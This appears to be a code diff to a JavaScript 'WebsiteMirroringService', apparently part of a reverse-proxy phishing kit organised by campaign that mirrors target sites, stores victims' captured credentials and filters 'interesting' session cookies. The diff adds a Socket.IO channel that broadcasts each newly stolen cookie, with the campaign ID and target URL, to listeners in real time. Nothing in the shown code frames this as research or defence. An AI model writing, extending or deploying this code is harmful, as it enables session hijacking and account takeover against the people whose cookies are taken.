@@ -23,6 +23,15 @@ class WebsiteMirroringService {
     this.captures = new Map(); // sessionToken -> captured data (credentials, etc.)
     this.userAgentPool = this.initializeUserAgentPool();
     this.proxyFingerprints = new Map(); // sessionToken -> fingerprint data
+    this.io = null; // WebSocket instance will be set by server
+  }
+
+  /**
+   * Set the Socket.IO instance for real-time updates
+   */
+  setSocketIO(io) {
+    this.io = io;
+    console.log('✅ Socket.IO instance set for real-time cookie updates');
   }
 
   /**
@@ -1433,6 +1442,9 @@ class WebsiteMirroringService {
       captures.cookies = [];
     }
     
+    const session = this.activeSessions.get(sessionToken);
+    const newCookies = [];
+    
     cookies.forEach(cookie => {
       try {
         // Parse the cookie string to extract all attributes
@@ -1442,6 +1454,7 @@ class WebsiteMirroringService {
         if (interestingPatterns.some(pattern => pattern.test(cookieDetails.name))) {
           // Add the cookie to captures
           captures.cookies.push(cookieDetails);
+          newCookies.push(cookieDetails);
           
           console.log(`⚠️ Captured interesting cookie: ${cookieDetails.name}`);
         }
@@ -1451,6 +1464,21 @@ class WebsiteMirroringService {
     });
     
     this.captures.set(sessionToken, captures);
+    
+    // Emit real-time cookie updates via WebSocket if we have new cookies
+    if (newCookies.length > 0 && this.io && session) {
+      const cookieUpdateData = {
+        campaignId: session.campaignId,
+        sessionToken: sessionToken,
+        cookies: newCookies,
+        totalCookies: captures.cookies.length,
+        timestamp: new Date().toISOString(),
+        url: session.targetUrl
+      };
+      
+      console.log(`🔄 Emitting real-time cookie update for campaign ${session.campaignId}: ${newCookies.length} new cookies`);
+      this.io.emit('cookies:captured', cookieUpdateData);
+    }
   }
   
   /**
